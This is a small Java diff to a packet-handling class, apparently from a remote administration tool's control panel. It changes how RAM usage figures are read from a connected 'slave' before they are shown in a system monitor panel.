@@ -9,8 +9,8 @@ public class PacketHERERAM extends AbstractPacket {
 
 	@Override
 	public void read(Slave slave, String line) throws Exception {
-		long MB = Long.parseLong(slave.readLine());
-		long MAX = Long.parseLong(slave.readLine());
+		long MB = slave.readLong();
+		long MAX = slave.readLong();
 		FrameControlPanel frame = FrameControlPanel.instances.get(slave);	
 		if (frame != null) {
 			PanelControlSystemMonitor panel = (PanelControlSystemMonitor) frame.panels.get("system monitor");
